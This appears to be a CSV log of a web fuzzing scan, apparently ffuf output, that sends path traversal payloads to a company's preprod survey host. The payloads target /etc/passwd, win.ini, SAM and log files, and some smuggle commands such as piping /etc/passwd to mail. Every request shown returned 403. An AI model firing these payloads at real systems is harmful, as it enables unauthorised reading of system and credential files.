FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,27.762359ms,
../config.js,https://survey-preprod-sandbox.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,28.066312ms,
../../../etc/passwd,https://survey-preprod-sandbox.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,28.875431ms,
./../../../../../../../../../etc/passw*,https://survey-preprod-sandbox.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,27.787564ms,
../../boot.ini,https://survey-preprod-sandbox.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,28.201381ms,
../../../logs/error.log,https://survey-preprod-sandbox.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,31.163864ms,
..///etc/passwd,https://survey-preprod-sandbox.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,28.055363ms,
file/../../../../../../../../etc,https://survey-preprod-sandbox.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,28.501641ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://survey-preprod-sandbox.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,28.833039ms,
./../../../../../../../../../etc/*,https://survey-preprod-sandbox.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,28.626478ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://survey-preprod-sandbox.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,28.045087ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,27.629194ms,
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,https://survey-preprod-sandbox.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,27.831218ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,https://survey-preprod-sandbox.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,31.699379ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,https://survey-preprod-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,,36688,403,312,17,7,text/html; charset=us-ascii,27.889454ms,
../.pass,https://survey-preprod-sandbox.officevibe.com/../.pass,,37462,403,312,17,7,text/html; charset=us-ascii,27.295554ms,
../.passwd,https://survey-preprod-sandbox.officevibe.com/../.passwd,,37467,403,312,17,7,text/html; charset=us-ascii,27.616803ms,
info2www '(../../../../../../../bin/mail root </etc/passwd>,https://survey-preprod-sandbox.officevibe.com/info2www '(../../../../../../../bin/mail root </etc/passwd>,,38767,403,312,17,7,text/html; charset=us-ascii,27.461853ms,
../../../../../logs/access.log,https://survey-preprod-sandbox.officevibe.com/../../../../../logs/access.log,,38985,403,312,17,7,text/html; charset=us-ascii,28.335993ms,
"cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://survey-preprod-sandbox.officevibe.com/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,39476,403,312,17,7,text/html; charset=us-ascii,28.005979ms,
../../apache/logs/error.log,https://survey-preprod-sandbox.officevibe.com/../../apache/logs/error.log,,40906,403,312,17,7,text/html; charset=us-ascii,27.67073ms,
../../../logs/access.log,https://survey-preprod-sandbox.officevibe.com/../../../logs/access.log,,45696,403,312,17,7,text/html; charset=us-ascii,27.570832ms,
../../logs/access.log,https://survey-preprod-sandbox.officevibe.com/../../logs/access.log,,50318,403,312,17,7,text/html; charset=us-ascii,28.954669ms,
../../../../../logs/error.log,https://survey-preprod-sandbox.officevibe.com/../../../../../logs/error.log,,51110,403,312,17,7,text/html; charset=us-ascii,27.096623ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://survey-preprod-sandbox.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,52401,403,312,17,7,text/html; charset=us-ascii,27.654951ms,
..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,https://survey-preprod-sandbox.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,,52408,403,312,17,7,text/html; charset=us-ascii,28.330696ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,https://survey-preprod-sandbox.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,,53350,403,312,17,7,text/html; charset=us-ascii,28.683929ms,
cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://survey-preprod-sandbox.officevibe.com/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,53439,403,312,17,7,text/html; charset=us-ascii,28.165047ms,
static/..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/static/..%5c..%5cetc/passwd,,54184,403,312,17,7,text/html; charset=us-ascii,41.434713ms,
..//etc/passwd;index.html,https://survey-preprod-sandbox.officevibe.com/..//etc/passwd;index.html,,55856,403,312,17,7,text/html; charset=us-ascii,28.53459ms,
css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://survey-preprod-sandbox.officevibe.com/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,56912,403,312,17,7,text/html; charset=us-ascii,27.602117ms,
..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,57302,403,312,17,7,text/html; charset=us-ascii,33.026837ms,
cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://survey-preprod-sandbox.officevibe.com/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,57730,403,312,17,7,text/html; charset=us-ascii,31.962677ms,
//../../data/config/microsrv.cfg,https://survey-preprod-sandbox.officevibe.com///../../data/config/microsrv.cfg,,63058,403,312,17,7,text/html; charset=us-ascii,27.488873ms,
../../apache/logs/access.log,https://survey-preprod-sandbox.officevibe.com/../../apache/logs/access.log,,65127,403,312,17,7,text/html; charset=us-ascii,28.569408ms,
..\\..\\..\\..\\..\\..\\..\\boot.ini,https://survey-preprod-sandbox.officevibe.com/..\\..\\..\\..\\..\\..\\..\\boot.ini,,65982,403,312,17,7,text/html; charset=us-ascii,27.977435ms,
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://survey-preprod-sandbox.officevibe.com/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,67936,403,312,17,7,text/html; charset=us-ascii,27.520839ms,
static/..%5c..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5cetc/passwd,,70464,403,312,17,7,text/html; charset=us-ascii,27.969796ms,
../webserver.ini,https://survey-preprod-sandbox.officevibe.com/../webserver.ini,,73462,403,312,17,7,text/html; charset=us-ascii,27.772787ms,
